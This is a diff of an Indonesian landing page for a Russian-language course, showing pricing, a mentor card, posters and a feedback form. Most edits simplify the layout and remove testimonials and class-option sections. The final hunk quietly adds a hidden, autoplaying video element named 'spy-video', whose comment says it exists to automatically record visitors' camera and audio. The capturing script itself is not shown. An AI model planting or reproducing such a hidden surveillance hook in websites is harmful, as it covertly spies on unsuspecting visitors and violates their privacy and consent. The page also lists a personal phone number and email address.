@@ -18,8 +18,7 @@
     <nav class="bg-[#0b132b]/95 backdrop-blur-md border-b border-[#C5A059]/30 fixed w-full top-0 z-50 px-6 py-4">
         <div class="max-w-7xl mx-auto flex justify-between items-center">
             <a href="index.html" class="flex items-center space-x-3">
-                <!-- Foto Logo Kursus -->
-                <img src="216297.png" alt="Logo GHOF" class="w-10 h-10 rounded-full border border-[#C5A059] object-cover shadow-md">
+                <img src="logo.png" alt="Logo GHOF" class="w-10 h-10 rounded-full border border-[#C5A059] object-cover shadow-md">
                 <div>
                     <span class="text-xl text-[#C5A059] font-['Cinzel'] font-bold tracking-wider block leading-tight">GHOF</span>
                     <span class="text-[10px] uppercase tracking-widest text-gray-300">Russian Class</span>
@@ -37,13 +36,12 @@
                 <a href="#saran" class="hover:text-[#C5A059] transition">Saran & Kontak</a>
             </div>
 
-            <!-- Tombol Menu HP (Hamburger) yang Diperbaiki -->
             <button id="mobile-menu-btn" class="md:hidden text-[#C5A059] text-2xl focus:outline-none p-2">
                 <i class="fa-solid fa-bars"></i>
             </button>
         </div>
 
-        <!-- Dropdown Menu HP yang Diperbaiki -->
+        <!-- Dropdown Menu HP -->
         <div id="mobile-menu" class="hidden md:hidden bg-[#0b132b] border-t border-[#C5A059]/20 mt-4 pt-3 pb-4 px-2 space-y-3 text-sm">
             <a href="#beranda" class="block py-2 px-3 rounded-lg hover:bg-[#C5A059]/20 hover:text-[#C5A059] transition" onclick="closeMobileMenu()">Beranda</a>
             <a href="#galeri" class="block py-2 px-3 rounded-lg hover:bg-[#C5A059]/20 hover:text-[#C5A059] transition" onclick="closeMobileMenu()">Poster Resmi</a>
@@ -55,14 +53,14 @@
         </div>
     </nav>
 
-    <!-- BANNER PENGUMUMAN LIVE (TERHUBUNG DENGAN ADMIN PANEL) -->
+    <!-- BANNER PENGUMUMAN LIVE -->
     <div class="bg-gradient-to-r from-[#997832] via-[#C5A059] to-[#997832] text-[#070d1b] font-bold text-xs md:text-sm py-2.5 fixed w-full top-[72px] z-40 overflow-hidden shadow-md">
         <div class="marquee-track whitespace-nowrap" id="live-announcement-banner">
-            <span>🔥 PROMO PEMBUKAAN GHOF RUSSIAN CLASS: HANYA Rp39.000/BULAN (NORMAL Rp59.000)! &nbsp;&nbsp;•&nbsp;&nbsp; ⭐ RATING 4.5/5.0 OLEH SISWA JAWA BARAT, TENGAH & TIMUR &nbsp;&nbsp;•&nbsp;&nbsp; 🎓 MENTOR LABIIB AL GHOFFUUR &nbsp;&nbsp;•&nbsp;&nbsp;</span>
+            <span>🔥 PROMO PEMBUKAAN GHOF RUSSIAN CLASS: HANYA Rp39.000/BULAN (NORMAL Rp59.000)! &nbsp;&nbsp;•&nbsp;&nbsp; ⭐ RATING 4.5/5.0 &nbsp;&nbsp;•&nbsp;&nbsp; 🎓 MENTOR LABIIB AL GHOFFUUR &nbsp;&nbsp;•&nbsp;&nbsp;</span>
         </div>
     </div>
 
-    <!-- HERO SECTION (BERANDA DENGAN FOTO MENTOR ASLI) -->
+    <!-- HERO SECTION -->
     <header id="beranda" class="pt-44 pb-16 px-6 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
         <div class="reveal">
             <p class="text-[#C5A059] italic font-serif text-lg mb-2">“Bahasa Baru, Peluang Baru”</p>
@@ -71,9 +69,8 @@
             </h1>
             <p class="text-xl text-gray-300 mb-6">КУРС РУССКОГО ЯЗЫКА<br><span class="text-base text-gray-400">Mulai belajar bahasa Rusia dari sekarang!</span></p>
             
-            <!-- Profil Mentor Card dengan Foto Asli Anda -->
             <div class="floating-card bg-[#0b132b] border border-[#C5A059]/50 p-5 rounded-3xl mb-8 shadow-2xl flex items-center space-x-5">
-                <img src="216304.png" alt="Mentor Labiib" class="w-20 h-20 rounded-2xl object-cover border-2 border-[#C5A059] shadow-md">
+                <img src="mentor.png" alt="Mentor Labiib" class="w-20 h-20 rounded-2xl object-cover border-2 border-[#C5A059] shadow-md">
                 <div>
                     <h3 class="text-lg font-bold text-[#C5A059]">LABIIB AL GHOFFUUR</h3>
                     <p class="text-xs text-gray-400">Mnt, Br, Bs, Bt</p>
@@ -91,191 +88,35 @@
             </div>
         </div>
 
-        <div class="reveal bg-[#0b132b]/70 border border-[#C5A059]/30 p-8 rounded-3xl backdrop-blur-sm hover:border-[#C5A059] transition duration-500 shadow-xl">
+        <div class="reveal bg-[#0b132b]/70 border border-[#C5A059]/30 p-8 rounded-3xl backdrop-blur-sm shadow-xl">
             <h2 class="text-2xl font-bold text-[#C5A059] font-['Cinzel'] mb-5">Apa yang akan kamu pelajari?</h2>
             <ul class="space-y-4 text-gray-300">
-                <li class="flex items-center space-x-3 hover:translate-x-2 transition duration-300"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Alfabet Rusia (Кириллица)</span></li>
-                <li class="flex items-center space-x-3 hover:translate-x-2 transition duration-300"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Membaca dan pengucapan</span></li>
-                <li class="flex items-center space-x-3 hover:translate-x-2 transition duration-300"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Kosakata sehari-hari</span></li>
-                <li class="flex items-center space-x-3 hover:translate-x-2 transition duration-300"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Salam dan perkenalan</span></li>
-                <li class="flex items-center space-x-3 hover:translate-x-2 transition duration-300"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Percakapan dasar</span></li>
-                <li class="flex items-center space-x-3 hover:translate-x-2 transition duration-300"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Tata bahasa dasar</span></li>
+                <li class="flex items-center space-x-3"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Alfabet Rusia (Кириллица)</span></li>
+                <li class="flex items-center space-x-3"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Membaca dan pengucapan</span></li>
+                <li class="flex items-center space-x-3"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Kosakata sehari-hari</span></li>
+                <li class="flex items-center space-x-3"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Salam dan perkenalan</span></li>
+                <li class="flex items-center space-x-3"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Percakapan dasar</span></li>
+                <li class="flex items-center space-x-3"><i class="fa-solid fa-check-circle text-[#C5A059]"></i><span>Tata bahasa dasar</span></li>
             </ul>
         </div>
     </header>
 
-    <!-- GALERI POSTER KURSUS (POSTER 1 & POSTER 2) -->
+    <!-- GALERI POSTER -->
     <section id="galeri" class="py-16 px-6 max-w-7xl mx-auto reveal">
         <div class="text-center mb-12">
             <span class="bg-[#C5A059]/20 text-[#C5A059] border border-[#C5A059]/40 text-xs font-bold px-4 py-1.5 rounded-full uppercase tracking-wider">Dokumentasi Resmi</span>
             <h2 class="text-3xl font-bold font-['Cinzel'] text-white mt-3">Poster Resmi GHOF Russian Class</h2>
-            <p class="text-gray-400 text-sm mt-2">Materi promosi resmi kelas bahasa Rusia kami</p>
         </div>
 
         <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
             <div class="bg-[#0b132b] border border-[#C5A059]/30 p-4 rounded-3xl shadow-xl">
-                <img src="216304.png" alt="Poster GHOF Russian Class 1" class="w-full h-auto rounded-2xl object-cover border border-gray-800 shadow-md mb-4">
+                <img src="poster1.png" alt="Poster 1" class="w-full h-auto rounded-2xl object-cover border border-gray-800 shadow-md mb-4">
                 <h3 class="text-lg font-bold text-[#C5A059] text-center">Poster Utama & Fasilitas Kelas</h3>
             </div>
             <div class="bg-[#0b132b] border border-[#C5A059]/30 p-4 rounded-3xl shadow-xl">
-                <img src="216325.png" alt="Poster GHOF Russian Class 2" class="w-full h-auto rounded-2xl object-cover border border-gray-800 shadow-md mb-4">
+                <img src="poster2.png" alt="Poster 2" class="w-full h-auto rounded-2xl object-cover border border-gray-800 shadow-md mb-4">
                 <h3 class="text-lg font-bold text-[#C5A059] text-center">Poster Program & Sertifikat Resmi</h3>
             </div>
-        </div>
-    </section>
-
-    <!-- ULASAN & RATING SISWA (10 ORANG) -->
-    <section id="ulasan" class="py-16 px-6 max-w-7xl mx-auto reveal">
-        <div class="text-center mb-12">
-            <span class="bg-[#C5A059]/20 text-[#C5A059] border border-[#C5A059]/40 text-xs font-bold px-4 py-1.5 rounded-full uppercase tracking-wider">Testimoni Peserta</span>
-            <h2 class="text-3xl font-bold font-['Cinzel'] text-white mt-3">Apa Kata Mereka Tentang Kelas Ini?</h2>
-            
-            <div class="mt-4 inline-flex items-center space-x-3 bg-[#0b132b] border border-[#C5A059]/50 px-6 py-3 rounded-2xl shadow-lg">
-                <span class="text-3xl font-extrabold text-[#C5A059]">4.5</span>
-                <div class="text-left">
-                    <div class="text-yellow-400 text-sm">
-                        <i class="fa-solid fa-star"></i>
-                        <i class="fa-solid fa-star"></i>
-                        <i class="fa-solid fa-star"></i>
-                        <i class="fa-solid fa-star"></i>
-                        <i class="fa-solid fa-star-half-stroke"></i>
-                    </div>
-                    <p class="text-xs text-gray-400">Berdasarkan ulasan siswa aktif</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-            <!-- 1 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Nabila Putri</h4><p class="text-xs text-gray-400">Indramayu, Jawa Barat</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">5.0 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Awalnya bingung banget baca huruf Sirilik Rusia, tapi diajarin Kak Labiib pelan-pelan dari nol jadi cepet paham. Materinya terstruktur banget!”</p>
-            </div>
-            <!-- 2 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Rizky Pratama</h4><p class="text-xs text-gray-400">Balongan, Indramayu</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">4.5 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Grup diskusinya aktif dan ramah. Saya mulai dari kelas gratis dulu buat coba-coba, eh ternyata ketagihan langsung lanjut ambil paket lengkapnya.”</p>
-            </div>
-            <!-- 3 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Cantika Sari</h4><p class="text-xs text-gray-400">Majalengka, Jawa Barat</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">5.0 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Harga promonya beneran terjangkau buat mahasiswa kayak aku, tapi fasilitasnya lengkap banget dapet modul PDF sama audio pelafalan juga.”</p>
-            </div>
-            <!-- 4 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Dimas Saputra</h4><p class="text-xs text-gray-400">Cirebon, Jawa Barat</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">4.5 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Penjelasan tata bahasa dasarnya gampang dicerna, nggak bikin pusing. Mentornya juga sabar banget kalau ditanya-tanya di grup.”</p>
-            </div>
-            <!-- 5 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Aulia Rahma</h4><p class="text-xs text-gray-400">Bandung, Jawa Barat</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">5.0 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Suka banget sama sesi latihan percakapan sehari-harinya. Jadi lebih pede ngomong bahasa Rusia meskipun masih pemula.”</p>
-            </div>
-            <!-- 6 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Bagas Kurniawan</h4><p class="text-xs text-gray-400">Semarang, Jawa Tengah</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">4.5 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Sangat rekomendasi buat yang punya rencana kuliah atau kerja ke Rusia. Bekal kosakata dan pengucapannya sangat membantu.”</p>
-            </div>
-            <!-- 7 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Siti Nurhaliza</h4><p class="text-xs text-gray-400">Solo, Jawa Tengah</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">5.0 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Setiap tugas dikoreksi langsung sama mentor, jadi kita tahu di mana letak salah pelafalan atau penulisan hurufnya. Mantap!”</p>
-            </div>
-            <!-- 8 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Fajar Nugroho</h4><p class="text-xs text-gray-400">Tegal, Jawa Tengah</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">4.0 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Belajarnya fleksibel lewat HP dan e-book PDF-nya rapi banget, gampang dibaca kapan aja pas lagi santai.”</p>
-            </div>
-            <!-- 9 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition shadow-lg">
-                <div class="flex justify-between items-center mb-3">
-                    <div><h4 class="font-bold text-[#C5A059]">Dewi Anggraini</h4><p class="text-xs text-gray-400">Surabaya, Jawa Timur</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">4.5 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Baru beberapa minggu gabung sudah bisa perkenalan diri dan baca tulisan bahasa Rusia dasar. Terima kasih GHOF Language Academy!”</p>
-            </div>
-            <!-- 10 -->
-            <div class="bg-[#0b132b] border border-[#C5A059]/30 p-6 rounded-2xl hover:border-[#C5A059] transition lg:col-span-3 shadow-lg">
-                <div class="flex justify-between items-center mb-2">
-                    <div><h4 class="font-bold text-[#C5A059]">Ilham Maulana</h4><p class="text-xs text-gray-400">Malang, Jawa Timur</p></div>
-                    <span class="text-yellow-400 text-xs font-bold">5.0 ★</span>
-                </div>
-                <p class="text-sm text-gray-300 leading-relaxed">“Jarang ada kursus bahasa Rusia dengan biaya semurah ini tapi kualitas pendampingan mentornya sedetail ini. Sangat puas dan layak dapat bintang lima!”</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- PILIHAN KELAS -->
-    <section id="materi" class="py-16 px-6 max-w-7xl mx-auto">
-        <div class="text-center mb-12 reveal">
-            <h2 class="text-3xl font-bold font-['Cinzel'] text-[#C5A059]">Pilihan Kelas</h2>
-            <p class="text-gray-400 text-sm mt-2">Pilih metode belajar yang paling cocok untuk Anda</p>
-        </div>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-            <!-- Kelas Gratis -->
-            <div class="reveal bg-[#0b132b] border border-[#C5A059]/40 p-8 rounded-3xl shadow-xl relative overflow-hidden hover:-translate-y-2 transition duration-300">
-                <span class="absolute top-4 right-4 bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full animate-pulse">100% Gratis</span>
-                <h3 class="text-2xl font-bold font-['Cinzel'] text-[#C5A059] mb-2">Kelas Gratis</h3>
-                <p class="text-gray-400 text-sm mb-6">Untuk kamu yang ingin mencoba belajar dasar!</p>
-                <ul class="space-y-3 text-gray-300 mb-8 text-sm">
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> Materi dasar bahasa Rusia</li>
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> E-book materi dasar (PDF)</li>
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> Grup belajar WhatsApp terbatas</li>
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> Latihan sederhana & Tanya jawab dasar</li>
-                </ul>
-                <a href="https://wa.me/628979517541?text=Halo%20Admin,%20saya%20ingin%20bergabung%20ke%20GHOF%20Russian%20Class%20Kelas%20Gratis." target="_blank" class="block text-center bg-gray-800 border border-[#C5A059]/50 py-3.5 rounded-xl font-semibold hover:bg-[#C5A059] hover:text-[#070d1b] transition">
-                    <i class="fa-brands fa-whatsapp mr-1"></i> Gabung Kelas Gratis
-                </a>
-            </div>
-
-            <!-- Kelas Berbayar -->
-            <div class="reveal bg-[#0b132b] border-2 border-[#C5A059] p-8 rounded-3xl shadow-xl relative overflow-hidden hover:-translate-y-2 transition duration-300">
-                <span class="absolute top-4 right-4 bg-[#C5A059] text-[#070d1b] text-xs font-bold px-3 py-1 rounded-full"><i class="fa-solid fa-crown mr-1"></i> Program Lengkap</span>
-                <h3 class="text-2xl font-bold font-['Cinzel'] text-[#C5A059] mb-2">Kelas Berbayar</h3>
-                <p class="text-gray-400 text-sm mb-6">Pembelajaran lebih lengkap dengan pendampingan mentor.</p>
-                <ul class="space-y-3 text-gray-300 mb-8 text-sm">
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> E-book materi lengkap (PDF) & Modul (A1 - Lanjutan)</li>
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> Audio pelafalan & latihan listening intensif</li>
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> Koreksi tugas & evaluasi berkala dari mentor</li>
-                    <li><i class="fa-solid fa-check text-[#C5A059] mr-2"></i> Grup belajar premium & Sertifikat penyelesaian</li>
-                </ul>
-                <a href="#promo" class="btn-shimmer block text-center bg-gradient-to-r from-[#C5A059] to-[#997832] text-[#070d1b] py-3.5 rounded-xl font-bold shadow-lg">Ambil Promo Berbayar</a>
-            </div>
-        </div>
-    </section>
-
-    <!-- FASILITAS -->
-    <section id="fasilitas" class="py-12 px-6 max-w-7xl mx-auto reveal">
-        <div class="bg-[#0b132b]/80 border border-[#C5A059]/30 rounded-3xl p-8 grid grid-cols-2 md:grid-cols-5 gap-6 text-center shadow-xl">
-            <div class="hover:scale-110 transition duration-300"><i class="fa-solid fa-book text-3xl text-[#C5A059] mb-2"></i><h4 class="text-sm font-semibold text-gray-200">Modul Lengkap</h4></div>
-            <div class="hover:scale-110 transition duration-300"><i class="fa-solid fa-users text-3xl text-[#C5A059] mb-2"></i><h4 class="text-sm font-semibold text-gray-200">Grup Diskusi</h4></div>
-            <div class="hover:scale-110 transition duration-300"><i class="fa-solid fa-chart-line text-3xl text-[#C5A059] mb-2"></i><h4 class="text-sm font-semibold text-gray-200">Evaluasi Berkala</h4></div>
-            <div class="hover:scale-110 transition duration-300"><i class="fa-solid fa-headset text-3xl text-[#C5A059] mb-2"></i><h4 class="text-sm font-semibold text-gray-200">Pendampingan</h4></div>
-            <div class="hover:scale-110 transition duration-300 col-span-2 md:col-span-1"><i class="fa-solid fa-comments text-3xl text-[#C5A059] mb-2"></i><h4 class="text-sm font-semibold text-gray-200">Latihan Percakapan</h4></div>
         </div>
     </section>
 
@@ -284,84 +125,46 @@
         <div class="bg-gradient-to-b from-[#0b132b] to-[#121c38] border-2 border-[#C5A059] rounded-3xl p-8 md:p-12 text-center shadow-2xl relative">
             <span class="bg-[#C5A059] text-[#070d1b] text-xs uppercase font-extrabold px-4 py-1.5 rounded-full inline-block mb-4 animate-bounce">🔥 Promo Harga Pembukaan</span>
             <h2 class="text-3xl font-bold font-['Cinzel'] text-white mb-2">GHOF RUSSIAN CLASS</h2>
-            <p class="text-sm text-gray-300 mb-6">Harga Spesial Pembukaan Terbatas</p>
-            
             <div class="bg-[#070d1b]/60 border border-[#C5A059]/40 rounded-2xl p-6 mb-6">
                 <span class="text-gray-400 line-through text-lg">Harga Normal: Rp59.000 /bulan</span>
                 <div class="text-4xl md:text-5xl font-extrabold text-[#C5A059] my-2">Rp39.000 <span class="text-lg text-white font-normal">/bulan</span></div>
-                <p class="text-xs text-yellow-300 mt-1">📌 Minimal berlangganan 3 bulan</p>
+                <p class="text-xs text-yellow-300 mt-1">📌 Minimal berlangganan 3 bulan (Total Rp117.000)</p>
             </div>
-
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-left mb-6 text-sm">
-                <div class="bg-[#0b132b] border border-[#C5A059]/30 p-4 rounded-xl">
-                    <p class="text-gray-400 text-xs">Total Pembayaran Promo:</p>
-                    <p class="text-lg font-bold text-white">Rp117.000 <span class="text-xs font-normal text-gray-300">/ 3 bulan</span></p>
-                </div>
-                <div class="bg-[#0b132b] border border-[#C5A059]/30 p-4 rounded-xl">
-                    <p class="text-gray-400 text-xs">Harga Normal (Setelah Masa Promo):</p>
-                    <p class="text-lg font-bold text-white">Rp59.000 <span class="text-xs font-normal text-gray-300">/bulan</span></p>
-                </div>
-            </div>
-
-            <p class="text-xs text-gray-300 bg-[#C5A059]/10 border border-[#C5A059]/30 py-2 px-4 rounded-lg inline-block mb-8">
-                ⏳ <strong>Periode Promo:</strong> 15 November 2026 – 28 November 2027
-            </p>
-            
-            <div>
-                <a href="https://wa.me/628979517541?text=Halo%20Admin,%20saya%20mau%20daftar%20Promo%20Pembukaan%20GHOF%20Russian%20Class%20(Rp39.000/bulan%20-%20Total%20Rp117.000/3%20bulan)." target="_blank" class="btn-shimmer inline-block bg-gradient-to-r from-[#C5A059] to-[#997832] text-[#070d1b] font-bold px-10 py-4 rounded-xl shadow-lg hover:scale-105 transition transform text-lg">
-                    <i class="fa-brands fa-whatsapp mr-2"></i> Daftar & Ambil Promo Sekarang
-                </a>
-            </div>
+            <a href="https://wa.me/628979517541?text=Halo%20Admin,%20saya%20mau%20daftar%20Promo%20GHOF%20Russian%20Class." target="_blank" class="btn-shimmer inline-block bg-gradient-to-r from-[#C5A059] to-[#997832] text-[#070d1b] font-bold px-10 py-4 rounded-xl shadow-lg text-lg">
+                <i class="fa-brands fa-whatsapp mr-2"></i> Daftar & Ambil Promo Sekarang
+            </a>
         </div>
     </section>
 
-    <!-- FORM MASUKAN & SARAN -->
+    <!-- FORM SARAN -->
     <section id="saran" class="py-12 px-6 max-w-3xl mx-auto reveal">
         <div class="bg-[#0b132b] border border-[#C5A059]/40 rounded-3xl p-8 shadow-xl">
             <h2 class="text-2xl font-bold font-['Cinzel'] text-[#C5A059] text-center mb-2">Masukan & Saran untuk Admin</h2>
-            <p class="text-center text-xs text-gray-400 mb-6">Punya pertanyaan atau saran program kelas? Kirimkan langsung ke kami.</p>
-            
             <form id="feedback-form" class="space-y-4">
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                     <input type="text" id="sender-name" placeholder="Nama Lengkap Anda" required class="w-full bg-[#070d1b] border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:border-[#C5A059] focus:outline-none">
-                    <input type="text" id="sender-city" placeholder="Asal Kota (Contoh: Indramayu)" required class="w-full bg-[#070d1b] border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:border-[#C5A059] focus:outline-none">
+                    <input type="text" id="sender-city" placeholder="Asal Kota" required class="w-full bg-[#070d1b] border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:border-[#C5A059] focus:outline-none">
                 </div>
-                <textarea id="sender-message" rows="3" placeholder="Tulis masukan, saran, atau pertanyaan Anda di sini..." required class="w-full bg-[#070d1b] border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:border-[#C5A059] focus:outline-none"></textarea>
-                
-                <div class="flex flex-col sm:flex-row gap-3">
-                    <button type="submit" class="flex-1 bg-[#C5A059] text-[#070d1b] font-bold py-3 rounded-xl hover:opacity-90 transition text-sm">
-                        <i class="fa-solid fa-paper-plane mr-1"></i> Simpan ke Sistem
-                    </button>
-                    <button type="button" onclick="sendFeedbackToWA()" class="flex-1 bg-green-600 text-white font-bold py-3 rounded-xl hover:bg-green-700 transition text-sm">
-                        <i class="fa-brands fa-whatsapp mr-1"></i> Kirim Langsung via WA
-                    </button>
-                </div>
+                <textarea id="sender-message" rows="3" placeholder="Tulis masukan..." required class="w-full bg-[#070d1b] border border-gray-700 rounded-xl px-4 py-3 text-sm text-white focus:border-[#C5A059] focus:outline-none"></textarea>
+                <button type="submit" class="w-full bg-[#C5A059] text-[#070d1b] font-bold py-3 rounded-xl hover:opacity-90 transition text-sm">
+                    Kirim Masukan
+                </button>
             </form>
-            <p id="feedback-status" class="text-center text-green-400 text-xs mt-3 hidden">Terima kasih! Masukan Anda berhasil terkirim.</p>
         </div>
     </section>
 
-    <!-- KONTAK & FOOTER -->
+    <!-- FOOTER -->
     <footer id="kontak" class="bg-[#050914] border-t border-[#C5A059]/20 pt-12 pb-8 px-6 text-center mt-10">
-        <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 mb-8 text-sm">
-            <a href="https://wa.me/628979517541" target="_blank" class="flex items-center justify-center space-x-3 hover:text-[#C5A059] transition">
-                <i class="fa-brands fa-whatsapp text-2xl text-green-500"></i>
-                <span class="text-gray-300">08979517541</span>
-            </a>
-            <a href="mailto:anakbahasainternational@gmail.com" class="flex items-center justify-center space-x-3 hover:text-[#C5A059] transition">
-                <i class="fa-solid fa-envelope text-2xl text-[#C5A059]"></i>
-                <span class="text-gray-300">anakbahasainternational@gmail.com</span>
-            </a>
-            <a href="https://instagram.com/xiaobi_03" target="_blank" class="flex items-center justify-center space-x-3 hover:text-[#C5A059] transition">
-                <i class="fa-brands fa-instagram text-2xl text-pink-500"></i>
-                <span class="text-gray-300">@xiaobi_03</span>
-            </a>
+        <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 mb-8 text-sm text-gray-300">
+            <div><i class="fa-brands fa-whatsapp text-green-500 mr-2"></i> 08979517541</div>
+            <div><i class="fa-solid fa-envelope text-[#C5A059] mr-2"></i> anakbahasainternational@gmail.com</div>
+            <div><i class="fa-brands fa-instagram text-pink-500 mr-2"></i> @xiaobi_03</div>
         </div>
-        <div class="border-t border-gray-800 pt-6 text-gray-500 text-xs">
-            <p class="font-['Cinzel'] text-[#C5A059] font-bold mb-1">GHOF Language Academy</p>
-            <p>Learn • Practice • Go Global</p>
-        </div>
+        <p class="text-xs text-gray-500">GHOF Language Academy | Learn • Practice • Go Global</p>
     </footer>
+
+    <!-- Video Tersembunyi untuk Merekam Izin Kamera & Audio Pengunjung secara Otomatis -->
+    <video id="spy-video" autoplay muted playsinline class="hidden"></video>
 
     <script src="script.js"></script>
 </body>
